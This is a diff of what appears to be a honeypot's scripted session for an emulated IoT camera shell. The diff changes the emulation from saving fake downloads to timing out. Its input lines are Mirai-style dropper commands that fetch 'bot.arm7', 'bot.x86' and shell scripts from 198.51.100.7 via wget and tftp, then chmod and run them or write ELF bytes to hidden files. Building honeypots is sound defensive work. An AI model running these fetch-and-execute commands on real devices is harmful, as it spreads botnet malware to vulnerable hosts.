@@ -1,19 +1,16 @@
-// Nothing is fetched: placeholder files are written, for the CPU their
-// name suggests.
-$ cd /tmp; wget http://198.51.100.7/bins/bot.arm7
+// The camera's internet access is blocked: DNS and outside addresses
+// time out. Every attempt is logged.
+$ cd /tmp; wget http://198.51.100.7/bins/bot.arm7; ls bot.arm7
 Connecting to 198.51.100.7 (198.51.100.7:80)
-saving to 'bot.arm7'
-bot.arm7             100% |********************************| 43427  0:00:00 ETA
-'bot.arm7' saved
-$ ls -l bot.arm7; chmod +x bot.arm7; ./bot.arm7 scan
--rw-r--r-- 1 root root 43427 Nov 17 12:00 bot.arm7
-Segmentation fault
-[exit 139]
-$ wget -q http://198.51.100.7/bins/bot.mips -O m; chmod +x m; ./m
-./m: line 1: syntax error: unexpected "("
+wget: can't connect to remote host (198.51.100.7): Connection timed out
+ls: bot.arm7: No such file or directory
 [exit 2]
+$ wget -q http://update.example.com/x.sh -O /tmp/x.sh; echo $?
+wget: bad address 'update.example.com'
+1
 $ wget -qO- http://198.51.100.7/x.sh
-#!/bin/sh
+wget: can't connect to remote host (198.51.100.7): Connection timed out
+[exit 1]
 $ wget https://198.51.100.7/x
 wget: not an http or ftp url: https://198.51.100.7/x
 [exit 1]
@@ -23,17 +20,32 @@ BusyBox v1.31.1 (2021-03-12 11:24:03 CST) multi-call binary.
 Usage: wget [-c|--continue] [--spider] [-q|--quiet] [-O FILE] [-o LOGFILE]
 	[--header 'header: value'] [-Y on/off] [-P DIR] [-S|--server-response] [-U|--user-agent AGENT] [-T SEC] URL...
 [exit 1]
-$ cd /; wget http://198.51.100.7/bot
-Connecting to 198.51.100.7 (198.51.100.7:80)
-wget: can't open 'bot': Read-only file system
+// The LAN: the router asks for a password, other hosts don't exist.
+$ wget http://192.168.1.1/
+Connecting to 192.168.1.1 (192.168.1.1:80)
+wget: server returned error: HTTP/1.1 401 Unauthorized
 [exit 1]
-$ tftp -g -r bot.x86 198.51.100.7; ls -l /bot.x86
+$ wget http://192.168.1.77/a
+Connecting to 192.168.1.77 (192.168.1.77:80)
+wget: can't connect to remote host (192.168.1.77): No route to host
+[exit 1]
+// The camera's own web server.
+$ wget -qO- http://127.0.0.1/ | head -1; wget -qO- http://localhost/nope; wget -q -O- http://127.0.0.1:22/
+<!DOCTYPE html>
+wget: server returned error: HTTP/1.1 404 Not Found
+wget: server returned error: SSH-2.0-dropbear_2019.78
+[exit 1]
+$ cd /; tftp -g -r bot.x86 198.51.100.7; ls -l /bot.x86
 tftp: can't open 'bot.x86': Read-only file system
 ls: /bot.x86: No such file or directory
 [exit 2]
-$ cd /tmp; tftp -g -r bot.x86 198.51.100.7; chmod 777 bot.x86; ./bot.x86
-./bot.x86: line 1: syntax error: unexpected "("
+$ cd /tmp; tftp -g -r bot.x86 198.51.100.7; ls bot.x86
+tftp: timeout
+ls: bot.x86: No such file or directory
 [exit 2]
+$ tftp -p -l nope 198.51.100.7
+tftp: can't open 'nope': No such file or directory
+[exit 1]
 $ tftp 198.51.100.7
 BusyBox v1.31.1 (2021-03-12 11:24:03 CST) multi-call binary.
 
@@ -43,6 +55,9 @@ Usage: tftp [OPTIONS] HOST [PORT]
 $ echo -ne '\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00' > /tmp/.d; chmod +x /tmp/.d; /tmp/.d
 Segmentation fault
 [exit 139]
+$ printf '\177ELF\001\002\001\000\000\000\000\000\000\000\000\000\000\002\000\010' > /tmp/m; chmod +x /tmp/m; /tmp/m
+/tmp/m: line 1: syntax error: unexpected "("
+[exit 2]
 $ curl http://198.51.100.7/x
 sh: curl: not found
 [exit 127]
